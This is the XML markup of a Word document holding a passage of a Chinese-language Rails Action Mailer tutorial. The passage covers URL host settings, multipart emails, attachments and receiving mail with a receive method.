                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "greeting") %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3B68F3B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当使用命名路由方法时你只需要提供 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:host</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="7E5781A0" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="445B51A2" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="300308140"/>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user_url(@user, :host</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "example.com") %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7E14C5C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对于一个邮件客户端来说，它并不存在地址上的信息去生成网络地址，因此，当你使用命名路由方法的时候只能用 “_url” 后缀的 helper 方法.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF4E18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事先为 mailer 做好默认主机名的设置也是一个不错的方法，你可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置文件中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:host</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中设置你的主机名。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="69930AA1" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="367CB75C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2019188600"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.action_mailer.default_url_options = { :host</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "example.com"</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="490BA3E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如果你用了这个设定，你最好在使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>url_for</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法的时候传入 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:only_path =&gt; false</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数. 这样可以保证每当 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>url_for</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 调用都能返回一个绝对地址。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9B6720"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2.7 发送复合邮件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD015C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如果对于同一个 action 你有不同的模板，Action Mailer 将会自动地为你生成发送复合邮件 , 以我们的 UserMailer 作为例子，如果你在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/user_mailer</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 下面同时存在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>welcome_email.text.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>welcome_email.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> , Action Mailer 将会自动地把 HTML 和 text 部分合成一份并发送。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE08DB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复合邮件的顺序依据</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionMailer::Base.default</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:parts_order</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数。如果你想要精确地控制邮件内容的顺序，你可以改变</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:parts_order</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数或者指定邮件用不同的顺序渲染。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A9B38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class UserMailer &lt; ActionMailer::Base def welcome_email(user) </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>user = user @url = user_url(</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>user) mail(:to =&gt; user.email, :subject =&gt; “Welcome to My Awesome Site”) do |format| format.html format.text end end end</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2959C45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这样将会先输入 HTML 部分，后输出 text 部分。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73CD5C0C"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2.8 发送带附件的邮件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2851258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附件可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attachments</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法：</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3DCDE754" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C199EE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UserMailer &lt; ActionMailer::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DF2159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welcome_email(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B32ACC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@user</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= user</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="021C0CB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@url</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= user_url(@user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0921877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attachments['terms.pdf'] = File.read('/path/terms.pdf')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="665629F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mail(:to</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; user.email,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="129585E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:subject</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "Please see the Terms and Conditions attached")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D3E9F8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367B934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1F3067D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这样就可以生成一份带附件的邮件了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F0D8E23"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3 接收邮件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66128A1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用 Action Mailer 解析和接收邮件相对来说比较复杂，因为你需要在邮件还未到达你的服务器之前就做好监听邮件的工作，你需要配置好你的系统的接收方式。要想要一个 Rails 程序接收邮件你需要:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70476E3D" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="269"/>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在你的 Mailer 中哦实现 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>receive</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 函数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5CFF9C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="270"/>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配置好你的email 服务器的转发邮件地址，你的程序将会收到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/path/to/app/script/rails runner 'UserMailer.receive(STDIN.read)'</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC701C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一旦叫做 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>receive</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在 Mailer 中被设置， Action Mailer 将会处理接收到的 Email 并保存在一个新的实例化的邮件对象中去，例子如下：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6120"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4644EA61" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="469BFDB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UserMailer &lt; ActionMailer::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="696242A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receive(email)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79A4F32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page = Page.find_by_address(email.to.first)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48125A7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page.emails.create(</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0324915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:subject</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; email.subject,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CE9A7B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:body</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; email.body</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AD3751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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D3FD5E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54FD39D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if</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>email.has_attachments?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11A08E7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email.attachments.each</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|attachment|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5785A51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page.attachments.create({</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D1B895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:file</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; attachment,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="646FF57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:description</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; email.subject</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3627C40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w:t>
            </w:r>
          </w:p>
